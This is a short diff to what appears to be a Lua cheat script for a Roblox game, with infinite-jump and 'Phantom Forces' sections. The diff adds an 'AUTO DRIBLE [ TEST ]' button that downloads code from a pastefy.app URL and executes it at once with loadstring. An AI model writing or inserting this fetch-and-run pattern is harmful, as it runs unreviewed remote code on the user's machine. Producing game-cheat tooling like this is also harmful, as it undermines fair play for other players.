@@ -87,6 +87,10 @@ local InfiniteJumpEnabled = T
     end)
 end)
 
+blr:CreateButton("AUTO DRIBLE [ TEST ]", function()
+loadstring(game:HttpGet("https://pastefy.app/N007rDXe/raw"))()
+end)
+
 local blr = PhantomForcesWindow:NewSection("STYLES")
 
 local function set_style(desired_style)
